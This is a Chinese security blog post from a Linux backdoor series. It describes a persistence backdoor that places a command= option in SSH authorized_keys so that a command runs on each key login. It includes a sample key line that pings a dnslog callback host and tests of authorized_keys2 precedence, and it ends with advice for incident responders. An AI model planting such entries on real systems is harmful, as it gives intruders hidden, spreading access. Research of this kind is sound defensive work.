<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzU1NDkwMzAyMg==&mid=2247492728&idx=1&sn=97e25efdf0a78cb94fa8ada80672f9cd&scene=21#wechat_redirect)

在我二十岁的时候，我回到了爸爸的小村庄，那是我的乌托邦 音乐： 悲伤玩具 - 悲伤游乐园 ![](http://res.wx.qq.com/mmbizappmsg/zh_CN/htmledition/js/images/icon/audio/icon_qqmusic_source664ebd.svg)  ![](https://y.gtimg.cn/music/photo_new/T002R500x500M000004MyBKF3yebyA.jpg) 

0x00 简介
-------

今天看见有安全研究员发了一篇 ssh 后门的文章，复现思考后分享给大家

> https://blog.thc.org/infecting-ssh-public-keys-with-backdoors

0x01 ssh 密钥登录
-------------

> 参考
> 
> https://www.commandlinux.com/man-page/man5/authorized_keys.5.html

运维人员管理 Linux 服务器时，对于一些较为固定的管理场景，经常把访问者的 ssh 公钥直接写入到被访问服务器的 `~/.ssh/authorized_keys` 中并进行相应的配置，这样访问者可以使用固定的电脑无需输入密码就可以访问到服务器，在一定程度上安全和便利兼得，但是其实这里有一个不常用的参数非常适合用来做后门——`command`

通常运维人员通过 `ssh-keygen -t rsa` 生成公钥文件 `~/.ssh/id_rsa.pub` , 格式如下

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzqGia4zIc3VBpJAX5ctj8pyk52BD1P5BKnMicj0wIXyYICia8jV6UGw1icQ/640?wx_fmt=png)

此时将这些字符拷贝进入服务器的  `~/.ssh/authorized_keys`  中，再将 ssh key 登录的相关配置打开，就可以实现免密码登录了

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1Ezr1icsIVkjLGoT4ibmnapLlibiaH3vgqeQ9DNDIzXKwvWNYcnaiapwdXAjuw/640?wx_fmt=png)

0x02 制作后门
---------

这里以 ping dnslog 为例, 实际后门还要考虑不影响用户正常登录，也就是我们的后门要在后台执行，这没啥难的

按照 0x01 章节的参考文章，其实在这段 ssh key 字符串前可以配置一些参数，其中的 `command` 参数在用户使用该 key 登录的时候自动调用

修改   `~/.ssh/authorized_keys`  ，添加恶意命令

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzibXb6TXj83ewibYibibu1UFSrN9575hmibqvcGBaHcxdZcJXjiaywjDoA5GQ/640?wx_fmt=png)

```
command="ping ssh-backdoor.g05vv6.dnslog.cn" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8sgy6ZmmvB5LvcSXx0WyAaDgbJTD+whVTN87iVTbFCIEq81Y0J3MOE+yHPmSEg4Jwv0AfDbPWS5QGfrWMn/NH5chOSqA82o6/M/OumeU2kO0MLP1ModQO/YblmEjQu2VjR03ojYpIu/8lKLq80qZwIbxP3px8/L3FUcksuGcBr95FN8drf0B7+zxyhaDGQvyVsHVBtbirHM0ORQvJ5PzRgSvU+fN9exMh82vibdrLRspN4Gy/s7oJfQh6zWxWZ8Xk4RZQ1MQgMqCZKDBvYToF/c4NP67J12gMcCJnoR3HBANITwrLHytCRcb2En6YfIj4wnCDWPOAapTWQZWJZ8FmzDEFcbjLwvUGccHHoe1SywdHXIGqPSdVjElcE4oBrYa+lH0NJjJG52s+z1hCpF8= join@ubuntu2004


```

无需重启 ssh 服务，直接在公钥所属的主机上使用 ssh 访问该服务器

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzQbicdx1r2OonlOGan5CZ136XdQhuE67VpLbeicLxIr17BAibgic2Qu4iaZA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzY7GGvqawbew2ls7RoicNMQ2ZiclZWGXpTJDe9pycrTDg6Qn1VRBqsWog/640?wx_fmt=png)

dnslog 平台成功获取到访问记录

0x03 此后门的意义
-----------

这里我觉得文章作者说的很有道理，所以直接翻译过来

*   有趣
    
*   服务器重启后，后门依旧存在
    
*   横向传播
    
    运维人员可能会把这些配置文件到处拷贝，造成后门的横向传播
    
*   云部署通常会将管理员的公钥复制到新实例 - 现在它们也会将您的后门复制到内部。
    

* * *

至此，作者的介绍基本结束，作者在 github 上还建立了一个项目，可以在原文中找到，下面的部分是我比较好奇的一些问题以及答案

0x04 我的思考
---------

### 1. 不止  `~/.ssh/authorized_keys`

其实在 `https://www.commandlinux.com/man-page/man5/authorized_keys.5.html` 写得很清楚， openssh 默认会识别  `~/.ssh/authorized_keys` 和  `~/.ssh/authorized_keys2`

具体配置在 `/etc/ssh/sshd_config` 的 `AuthorizedKeysFile` 参数

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzocP1znFNEhpNaSbyzTmMzfMGCVPUcJAictPLBeQyzT1DEy97FicTpjkA/640?wx_fmt=png)

可以看到，官方希望未来忽略  `~/.ssh/authorized_keys2`

将服务器上的  `~/.ssh/authorized_keys`  修改为  `~/.ssh/authorized_keys2` ，并修改 dnslog 地址

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzpG4icoNOicy3hTjE5LO4cflNeMQZuF6EbTdWYvaxia0gia01kC730w3ULQ/640?wx_fmt=png)

使用公钥登录该 ssh 服务器

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzQbicdx1r2OonlOGan5CZ136XdQhuE67VpLbeicLxIr17BAibgic2Qu4iaZA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EziarWPa6XNUD1cgrUuCgTiaZLDZUWMibmicQXhsLJV3AnQ4iactYwibIrvS9Q/640?wx_fmt=png)

因此，在对相关文件进行安全排查的时候，不要忘了 `~/.ssh/authorized_keys2`

### 2. 如果两个文件都存在，是否同时有效

如果 `~/.ssh/authorized_keys`  和 `~/.ssh/authorized_keys2`  同时存在，是否都有效呢？

再来一台 Linux 主机，都是用 `ssh-copy-id` 程序将自己的公钥传到服务器上

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1Ez2jiadtKDQgYBGxicgSERjZggt9sSredJE38vYq1mZazE2JAiaC82icw51g/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1Ez4adG5BJJkgrBFdWic3vKMISMRQOhzOXZRiaaSAHWwWF6djXicAR6cqUYw/640?wx_fmt=png)

默认情况下，两台访问者主机都可以通过 ssh-key 访问服务器

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzlvQwT4TZQL6Riajk8jxok5D0Hdf0ofnYlm8Y2Tnib8nGicso3KUUuOCeg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzyCibfR3icy3crn32hAOIyrFtpFmibW0ym8eriar5Ijts8ymmKQPtjuwFNg/640?wx_fmt=png)

现在将两个 ssh key 放在  `~/.ssh/authorized_keys`  和 `~/.ssh/authorized_keys2`  中各一个

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzsaPdu1yl6YhIiarA9VcCJ62tO8SBduTMAE1rWuAyzibA2TwBv0yH9ThQ/640?wx_fmt=png)

再次测试两个访问者主机通过 ssh key 访问服务器

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzTfD4QT437kGERgopfHYLlRLRd1Tuuhgibh4lM1CXlc7dM7hdGJM2vzQ/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzM6hmNuuMADKVqLHzRWoxetJRNsCicTK1R1I8yX6xuzKriadmzFcUDePQ/640?wx_fmt=png)

`~/.ssh/authorized_keys`  和 `~/.ssh/authorized_keys2` 两个文件可以同时存在，均有效

### 3. 两个文件放置同一个 key 会怎么样

`~/.ssh/authorized_keys`  放置默认的 ssh key； `~/.ssh/authorized_keys2` 放置包含后门的 ssh key

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1Ez5odGE1NtUtOKH5ImssCWqorJsyA0gPicRoxFvZAAQaeznLudCMgp4iaw/640?wx_fmt=png)

使用 ssh key 登录服务器

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzodT6dh10fG1xRiaSsKrKiaBWb9qf37QpuCOl0On7u7BQ8BnmiaAJNKV9Q/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzjXCCjRbJBmPicEFuPeSiarX40UJooJiaaIGvaFWmVc8o37zaEblntzt1g/640?wx_fmt=png)

并未触发后门

`~/.ssh/authorized_keys`  放置包含后门的 ssh key； `~/.ssh/authorized_keys2` 放置默认的 ssh key

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzObJrbf1ZF6XZgGGpJZpdrzoYesagqY9bycFuoh4nJ5dibg6VX4Wxibmw/640?wx_fmt=png)

使用 ssh key 登录服务器

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1EzQbicdx1r2OonlOGan5CZ136XdQhuE67VpLbeicLxIr17BAibgic2Qu4iaZA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRc5QwF6e2QK0hxW5Njoic1Ezjkxsf5iaQvib4TBKqjcv1TNjSJq8uBu48ze3xdAIcVFYAYPUuy6IWMyg/640?wx_fmt=png)

成功触发后门，所以如果两个文件放置同一个 ssh key，默认配置会先读取  `~/.ssh/authorized_keys`

### 4. ssh 配置文件后门检查

> 之前的我写的一篇 ssh config 后门中介绍了 openssh 配置方面的后门，主要针对 ssh 客户端，openssh 的客户端和服务器端，尤其是服务器，可配置的项非常多，各种情况都可以配置相应的的程序来处理，其实这些都可以作为后门，但是作为后门的时候必须保证原本该项配置应有的效果，所以做安全检查的时候应该更加全面一些, 在后续的应急响应手册中会尽可能全面一些

0x05 往期文章
---------

*   [SSH Config 后门 ｜ Linux 后门系列](http://mp.weixin.qq.com/s?__biz=MzU1NDkwMzAyMg==&mid=2247490836&idx=1&sn=fe37c5a09ff70717e60af11cb46831d8&chksm=fbdd2995ccaaa0837b7a9adce45dd721f90e9860590337df86e19efa673b5c19b02866d8d04c&scene=21#wechat_redirect)  
    
*   [Linux 应急响应手册 v1.7](http://mp.weixin.qq.com/s?__biz=MzU1NDkwMzAyMg==&mid=2247492584&idx=1&sn=8bf428ce94b32b9fef07a80dee06c64c&chksm=fbded769cca95e7ff6dea3128798c77557627de30851d47cc6c06dd9abc6b7c9abd764acce43&scene=21#wechat_redirect)  
    
*   [更新源后门 ｜ Linux 后门系列](http://mp.weixin.qq.com/s?__biz=MzU1NDkwMzAyMg==&mid=2247492576&idx=1&sn=7aa50fcdf84109b49b3c26848b07c8b7&chksm=fbded761cca95e77f016b4134d1b7f33a840c715d0d60441dc0186dea6388b628a91da6039ae&scene=21#wechat_redirect)
    

![](https://mmbiz.qpic.cn/mmbiz_png/fZT30hrVgRePhExdNHBxNXo5ykEQRnV6h5D294E334CzZaiaFRfibvESn4icHoenCrJf06jfJNVBZwpaAmCZbM6Gw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

有态度，不苟同